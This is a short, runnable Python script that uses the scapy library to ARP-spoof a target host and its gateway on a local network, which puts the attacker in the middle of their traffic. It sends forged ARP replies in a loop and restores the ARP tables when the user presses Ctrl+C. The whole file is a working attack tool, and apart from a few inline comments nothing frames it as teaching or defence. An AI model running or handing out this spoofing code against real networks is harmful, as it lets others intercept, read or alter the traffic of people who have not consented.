import time
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # Who has this ip? using an ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet object
    arp_request_broadcast = broadcast / arp_request  # New packet
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]  # Function send and receive customized
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)  # Fixed typo here
    scapy.send(packet, count=4, verbose=False)

target_ip = "192.168.1.85"
gateway_ip = "192.168.1.254"

try:
    sent_packets = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets += 2
        print("\r[+] Packets sent: " + str(sent_packets), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C...Resetting ARP tables\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
